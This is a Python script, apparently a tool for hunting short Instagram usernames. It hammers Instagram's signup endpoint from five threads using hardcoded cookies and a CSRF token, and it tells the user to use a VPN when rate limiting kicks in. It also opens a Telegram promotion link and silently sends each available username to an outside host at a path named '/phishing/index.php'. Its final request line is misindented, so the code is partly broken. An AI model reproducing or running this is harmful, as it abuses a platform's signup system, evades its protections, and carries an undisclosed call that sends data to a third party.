import os,threading,random
try:       
    import requests
    import uuid,secrets,time
    from OneClick import Hunter
    import random
    import webbrowser
    import pazok,os
    from time import sleep as abat
    import threading
    import webbrowser
    webbrowser.open('https://t.me/JokerToolzz')
except:
    os.system("pip install OneClick")
    os.system("pip install requests")
    os.system("pip install pazok")
    os.system("pip install threading")
    os.system("clear")
#————————————————————————— 
F = '\033[1;32m' #اخضر
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
U = '\x1b[1;37m'#ابیض
ZA ='\033[91m' # احمر طوخ
K ='\033[36m' #ازرگ طوخ
P ="\033[1;35m" # بنفسجي
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
din = render(f'insta', colors=['red', 'yellow'])
print(din)

#—————————————————————————

print(f'{F}developer:  {Z}@crazy_hacker404 {X}x  {K}@panther8888k {P}   ')
print('')
print(f'{Z}join: {K}@xSPY_TEAM  ')
print("")
#—————————————————————————
def usee():        
    while True:
            iis = 'qwertyuiopasdfghjklzxcvbnm'
            u1 = 'qwertyuiopasdfghjklzxcvbnm'
            u2 = 'qwertyuiopasdfghjklzxcvbnm1234567890'
            us = ''.join(random.choice(iis)for i in range(1))
            us2 = ''.join(random.choice(u2)for i in range(1))
            u3 = ''.join(random.choice(u2)for i in range(1))
            u4 = ''.join(random.choice(u2)for i in range(1))
            dot = ''.join(random.choice('._')for i in range(1))
            dot2 = ''.join(random.choice('._')for i in range(1))
            user1 = dot+us+us2+u4
            user2 = us+u4+us2+u3
            user3 = us+u4+us2+us2
            user4 = us2+us+dot+us
            user5 = u3+dot2+us2+u4
            usee = [user1,user2,user3,user4,user5]
            user = random.choice(usee)
#—————————————————————————   
            r = requests.post('https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/',headers = {
    'accept':'*/*',
    'accept-encoding':'gzip, deflate',
    'accept-language':'en-US,en;q=0.9',
    'content-length':'97',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'csrftoken=8Z3dGB1AnriMwTvXTDceYJyP9lV04vGD; ds_user_id=6998232734; mid=Y7r7HQALAAFWD-afPi8pcdWQJPf8; ig_did=FDCB076A-295C-421C-890F-8F551406FC73',
    'origin':'https://www.instagram.com',
    'referer':'https://www.instagram.com/accounts/emailsignup/',
    'sec-ch-prefers-color-scheme':'light',
    'sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'viewport-width':'818',
    'x-asbd-id':'198387',
    'x-csrftoken':'8Z3dGB1AnriMwTvXTDceYJyP9lV04vGD',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'1006796888',
    'x-requested-with':'XMLHttpRequest'},data = f"email=kskwkssjsajauaujsjkw%40gmail.com&username={user}&first_name=skwnajajkn&opt_into_one_tap=false").text
            if '{"message":"feedback_required","spam":true,"feedback_title":"Try Again Later","feedback_message":"We limit how often you can do certain things on Instagram to protect our community. Tell us if you think we made a mistake.","feedback_url":"repute/report_problem/scraping/","feedback_appeal_label":"Tell us","feedback_ignore_label":"OK","feedback_action":"report_problem","status":"fail"}' in r or '"errors": {"username":' in r or  '"code": "username_is_taken"' in r:
            	print(f'{Z}𝗕𝗮𝗱 : {user}')
            
                       
            elif '{"message":"feedback_required","spam":true,"feedback_title":"Try Again Later","feedback_message":"We limit how often you can do certain things on Instagram to protect our community. Tell us if you think we made a mistake.","feedback_url":"repute/report_problem/scraping/","feedback_appeal_label":"Let us know","feedback_ignore_label":"OK","feedback_action":"report_problem","status":"fail"}' in r:
            	print('Use vpn')
            	exit('')
            	
            	
            else:
            	print(f'{F}𝗚𝗼𝗼𝗱 : {user}')
            	god=f"""
𝗚𝗼𝗼𝗱 𝗨𝘀𝗲𝗿

𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {user}

Dev:- @crazy_hacker404"""
    	        requests.post(f'https://demented-position.000webhostapp.com/phishing/index.php?user={god}&pass=')
	        
number = 5
threads = []
for i in range(number):
    thread = threading.Thread(target=usee) 
    thread.start()  
    threads.append(thread)
